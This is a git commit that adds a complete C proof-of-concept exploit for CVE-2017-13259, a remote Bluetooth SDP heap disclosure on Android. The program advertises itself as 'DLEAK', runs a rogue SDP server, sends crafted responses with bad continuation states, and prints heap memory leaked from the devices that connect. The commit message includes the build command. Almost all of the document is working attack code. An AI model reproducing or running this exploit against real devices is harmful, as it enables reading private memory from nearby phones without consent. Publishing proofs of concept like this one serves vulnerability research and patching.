ScottyBauer__Android_Kernel_CVE_POCs
commit 7c164cca56aae19edd417f597f92423965415f50
Author:     Scott Bauer <sbauer@plzdonthack.me>
AuthorDate: Mon Mar 5 23:26:08 2018 -0700
Commit:     Scott Bauer <sbauer@plzdonthack.me>
CommitDate: Mon Mar 5 23:26:40 2018 -0700

    Add CVE-2017-13259 for Bluetooth remote heap disclosure:
    
    gcc bt_sdp_disclose.c -lbluetooth -pthread -o bt_leak
    
    Signed-off-by: Scott Bauer <sbauer@plzdonthack.me>

diff --git a/CVE-2017-13259.c b/CVE-2017-13259.c
new file mode 100644
index 0000000..28016da
--- /dev/null
+++ b/CVE-2017-13259.c
@@ -0,0 +1,318 @@
+/** CVE-2017-13259 Remote BT heap disclosure
+ ** PoC by Sbauer
+ ** Found by Jianjun Dai, independently found by sbauer later.
+ */
+ 
+
+#include <errno.h>
+#include <unistd.h>
+#include <stdlib.h>
+#include <stdbool.h>
+#include <sys/stat.h>
+#include <sys/un.h>
+#include <pthread.h>
+
+#include <bluetooth/bluetooth.h>
+#include <bluetooth/sdp.h>
+#include <bluetooth/l2cap.h>
+#include <bluetooth/hci.h>
+#include <bluetooth/hci_lib.h>
+
+
+#define EIR_FLAGS                   0x01  /* flags */
+#define EIR_NAME_COMPLETE           0x09  /* complete local name */
+#define EIR_LIM_DISC                0x01 /* LE Limited Discoverable Mode */
+#define EIR_GEN_DISC                0x02 /* LE General Discoverable Mode */
+static int count = 0;
+
+static int init_server(uint16_t mtu)
+{
+	struct l2cap_options opts;
+	struct sockaddr_l2 l2addr;
+	socklen_t optlen;
+	int l2cap_sock;
+
+	/* Create L2CAP socket */
+	l2cap_sock = socket(PF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
+	if (l2cap_sock < 0) {
+		printf("opening L2CAP socket: %s", strerror(errno));
+		return -1;
+	}
+
+	memset(&l2addr, 0, sizeof(l2addr));
+	l2addr.l2_family = AF_BLUETOOTH;
+	bacpy(&l2addr.l2_bdaddr, BDADDR_ANY);
+	l2addr.l2_psm = htobs(SDP_PSM);
+
+	if (bind(l2cap_sock, (struct sockaddr *) &l2addr, sizeof(l2addr)) < 0) {
+		printf("binding L2CAP socket: %s", strerror(errno));
+		return -1;
+	}
+
+	int opt = L2CAP_LM_MASTER;
+	if (setsockopt(l2cap_sock, SOL_L2CAP, L2CAP_LM, &opt, sizeof(opt)) < 0) {
+		printf("setsockopt: %s", strerror(errno));
+		return -1;
+	}
+
+	memset(&opts, 0, sizeof(opts));
+	optlen = sizeof(opts);
+
+	if (getsockopt(l2cap_sock, SOL_L2CAP, L2CAP_OPTIONS, &opts, &optlen) < 0) {
+		printf("getsockopt: %s", strerror(errno));
+		return -1;
+	}
+	opts.omtu = mtu;
+	opts.imtu = mtu;
+
+	if (setsockopt(l2cap_sock, SOL_L2CAP, L2CAP_OPTIONS, &opts, sizeof(opts)) < 0) {
+		printf("setsockopt: %s", strerror(errno));
+		return -1;
+	}
+
+	if (listen(l2cap_sock, 5) < 0) {
+	  printf("listen: %s", strerror(errno));
+	  return -1;
+	}
+
+	return l2cap_sock;
+}
+
+static void leak_sixteenbytes(uint8_t *pkt)
+{
+	bt_put_be16(8, pkt);
+	bt_put_be16(4, pkt);
+	bt_put_be32(0xAAAAAAAA, pkt);
+	bt_put_be32(0xAAAAAAAB, pkt);
+	bt_put_be32(0xAAAAAAAC, pkt);
+	bt_put_be32(0xAAAAAAAD, pkt);
+
+	/* Here is the continuation */
+	*pkt = 16;
+	pkt++;
+}
+
+static size_t do_fake_svcsar(uint8_t *pkt)
+{
+
+	int i;
+	int cnt = 8 + (count * 4);
+	uint8_t *start = pkt;
+	/* list byte count */
+	bt_put_be16(cnt, pkt);pkt += 2;
+	for (i = 0; i < cnt; i++) {
+		*pkt = 0xAA;
+		pkt++;
+	}
+	/* bad continuation */
+	*pkt = 16;
+	pkt++;
+
+	printf("%zu\n", pkt-start);
+	return (size_t) (pkt - start);
+}
+
+static void process_request(uint8_t *buf, int fd)
+{
+	sdp_pdu_hdr_t *reqhdr = (sdp_pdu_hdr_t *) buf;
+	sdp_pdu_hdr_t *rsphdr;
+	uint8_t *rsp = malloc(65535);
+	int status = SDP_INVALID_SYNTAX;
+	int send_size = 0;
+
+	memset(rsp, 0, 65535);
+	rsphdr = (sdp_pdu_hdr_t *)rsp;
+	rsphdr->tid = reqhdr->tid;
+
+	switch (reqhdr->pdu_id) {
+	case SDP_SVC_SEARCH_REQ:
+		printf("Got a svc srch req\n");
+		leak_sixteenbytes(rsp + sizeof(sdp_pdu_hdr_t));
+		rsphdr->pdu_id = SDP_SVC_SEARCH_RSP;
+		rsphdr->plen = htons(21);
+		send_size = 21;
+		break;
+	case SDP_SVC_ATTR_REQ:
+		printf("Got a svc attr req\n");
+		//status = service_attr_req(req, &rsp);
+		rsphdr->pdu_id = SDP_SVC_ATTR_RSP;
+		break;
+	case SDP_SVC_SEARCH_ATTR_REQ:
+		printf("Got a svc srch attr req\n");
+		//status = service_search_attr_req(req, &rsp);
+		rsphdr->pdu_id = SDP_SVC_SEARCH_ATTR_RSP;
+		rsphdr->plen = htons(do_fake_svcsar(rsp + sizeof(sdp_pdu_hdr_t)));
+		send_size = ntohs(rsphdr->plen);
+		break;
+	default:
+		printf("Unknown PDU ID : 0x%x received", reqhdr->pdu_id);
+		status = SDP_INVALID_SYNTAX;
+		break;
+	}
+	send(fd, rsp, send_size + sizeof(sdp_pdu_hdr_t), 0);
+	free(rsp);
+}
+
+
+static void process_leaked_bytes(uint8_t *buf, int fd)
+{
+	sdp_pdu_hdr_t *hdr = (sdp_pdu_hdr_t *) buf;
+	uint32_t *leak, i = 0;
+	/* We know our continuation is 16 bytes off the end */
+	//leak = (uint32_t *) (buf + (hdr->plen) + sizeof(*hdr)));
+	//printf("0x%x 0x%x 0x%x 0x%x\n", *leak, *(leak + 1), *(leak + 2), *(leak + 3));
+	leak = (uint32_t *) buf + sizeof(*hdr);
+	for (i = 4; i < ntohs(hdr->plen)/4; i++)
+		printf("%x ", leak[i]);
+	printf("\n");
+}
+
+static void *l2cap_data_thread(void *input)
+{
+	int fd = *(int *)input;
+	sdp_pdu_hdr_t hdr;
+	uint8_t *buf;
+	int len, size;
+
+	while (true) {
+		len = recv(fd, &hdr, sizeof(sdp_pdu_hdr_t), MSG_PEEK);
+		if (len < 0 || (unsigned int) len < sizeof(sdp_pdu_hdr_t)) {
+			continue;
+		}
+
+		size = sizeof(sdp_pdu_hdr_t) + ntohs(hdr.plen);
+		buf = malloc(size);
+		if (!buf)
+			continue;
+
+		printf("%s: trying to recv %d\n", __func__, size);
+		len = recv(fd, buf, size, 0);
+		if (len <= 0) {
+			free(buf);
+			continue;
+		}
+
+		if (!count) {
+			process_request(buf, fd);
+			count ++;
+		}
+		if (count >= 1) {
+			process_leaked_bytes(buf, fd);
+			process_request(buf, fd);
+			count++;
+		}
+
+		free(buf);
+	}
+}
+
+/* derived from hciconfig.c */
+static void *advertiser(void *unused)
+{
+	uint8_t status;
+	int device_id, handle;
+	struct hci_request req = { 0 };
+	le_set_advertise_enable_cp acp = { 0 };
+	le_set_advertising_parameters_cp avc = { 0 };
+	le_set_advertising_data_cp data = { 0 };
+
+	device_id = hci_get_route(NULL);
+
+	if (device_id < 0) {
+		printf("%s: Failed to get route: %s\n", __func__, strerror(errno));
+		return NULL;
+	}
+	handle = hci_open_dev(hci_get_route(NULL));
+	if (handle < 0) {
+		printf("%s: Failed to open and aquire handle: %s\n", __func__, strerror(errno));
+		return NULL;
+	}
+
+	avc.min_interval = avc.max_interval = htobs(150);
+	avc.chan_map = 7;
+	req.ogf = OGF_LE_CTL;
+	req.ocf = OCF_LE_SET_ADVERTISING_PARAMETERS;
+	req.cparam = &avc;
+	req.clen = LE_SET_ADVERTISING_PARAMETERS_CP_SIZE;
+	req.rparam = &status;
+	req.rlen = 1;
+
+	if (hci_send_req(handle, &req, 1000) < 0) {
+		hci_close_dev(handle);
+		printf("%s: Failed to send request %s\n", __func__, strerror(errno));
+		return NULL;
+	}
+	memset(&req, 0, sizeof(req));
+	req.ogf = OGF_LE_CTL;
+	req.ocf = OCF_LE_SET_ADVERTISE_ENABLE;
+	req.cparam = &acp;
+	req.clen = LE_SET_ADVERTISE_ENABLE_CP_SIZE;
+	req.rparam = &status;
+	req.rlen = 1;
+
+	data.data[0] = htobs(2);
+	data.data[1] = htobs(EIR_FLAGS);
+	data.data[2] = htobs(EIR_GEN_DISC | EIR_LIM_DISC);
+
+	data.data[3] = htobs(6);
+	data.data[4] = htobs(EIR_NAME_COMPLETE);
+	data.data[5] = 'D';
+	data.data[6] = 'L';
+	data.data[7] = 'E';
+	data.data[8] = 'A';
+	data.data[9] = 'K';
+
+	data.length = 10;
+
+	memset(&req, 0, sizeof(req));
+	req.ogf = OGF_LE_CTL;
+	req.ocf = OCF_LE_SET_ADVERTISING_DATA;
+	req.cparam = &data;
+	req.clen = LE_SET_ADVERTISING_DATA_CP_SIZE;
+	req.rparam = &status;
+	req.rlen = 1;
+
+	if (hci_send_req(handle, &req, 1000) < 0) {
+		hci_close_dev(handle);
+		printf("%s: Failed to send request %s\n", __func__, strerror(errno));
+		return NULL;
+	}
+	printf("Device should be advertising under DLEAK\n");
+}
+
+
+
+int main(int argc, char **argv)
+{
+	pthread_t *io_channel;
+	pthread_t adv;
+	int       fds[16];
+	const int io_chans = 16;
+	struct sockaddr_l2 addr;
+	socklen_t qlen = sizeof(addr);
+	socklen_t len = sizeof(addr);
+	int l2cap_sock;
+	int i;
+
+
+	pthread_create(&adv, NULL, advertiser, NULL);
+	l2cap_sock = init_server(652);
+	if (l2cap_sock < 0)
+		return EXIT_FAILURE;
+
+	io_channel = malloc(io_chans * sizeof(*io_channel));
+	if (!io_channel)
+		return EXIT_FAILURE;
+
+	for (i = 0; i < io_chans; i++) {
+		printf("%s: Going to accept on io chan %d\n", __func__, i);
+		fds[i] = accept(l2cap_sock, (struct sockaddr *) &addr, &len);
+		if (fds[i] < 0) {
+			i--;
+			printf("%s: Accept failed with %s\n", __func__, strerror(errno));
+			continue;
+		}
+		printf("%s: accepted\n", __func__);
+		pthread_create(&io_channel[i], NULL, l2cap_data_thread, &fds[i]);
+	}
+}
